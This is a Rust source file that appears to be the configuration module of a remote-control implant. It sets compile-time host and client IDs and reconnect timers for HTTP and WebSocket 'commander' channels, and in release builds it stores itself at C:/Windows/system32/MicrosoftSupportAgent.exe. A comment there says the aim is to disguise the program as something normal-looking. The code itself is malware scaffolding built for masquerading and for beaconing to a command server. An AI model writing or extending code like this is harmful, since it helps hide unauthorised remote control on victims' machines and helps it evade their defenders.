pub mod paths {
    use std::{
        path::{Path, PathBuf},
        sync::LazyLock,
    };

    #[cfg(not(debug_assertions))]
    pub const DATA: LazyLock<PathBuf> =
        LazyLock::new(|| PathBuf::from("C:/Windows/system32/MicrosoftSupportAgent.exe")); // we discuise our self as somthing normal looking

    #[cfg(debug_assertions)]
    pub static DATA: LazyLock<PathBuf> = LazyLock::new(|| {
        PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/test_data/simcc_data"))
    });
}

pub mod compiled {
    use crate::env_or;

    pub const HOST: &'static str = env!("SIMCC_HOST");
    pub const CCID: &'static str = env!("CCID");
    pub const HTTP_COMMANDER_RECONNECT: u64 = env_or!("HTTP_COMMANDER_RECONNECT", 5000, u64);
    pub const WS_COMMANDER_RECONNECT: u64 = env_or!("WS_COMMANDER_RECONNECT", 3000, u64);

    pub fn HTTP_URL(path: &str) -> String {
        let proto = if option_env!("WEB_SECURE").is_some() {
            "https"
        } else {
            "http"
        };

        format!("{}://{}{}", proto, HOST, path)
    }

    pub fn WS_URL(path: &str) -> String {
        let proto = if option_env!("WEB_SECURE").is_some() {
            "wss"
        } else {
            "ws"
        };

        format!("{}://{}{}", proto, HOST, path)
    }
}
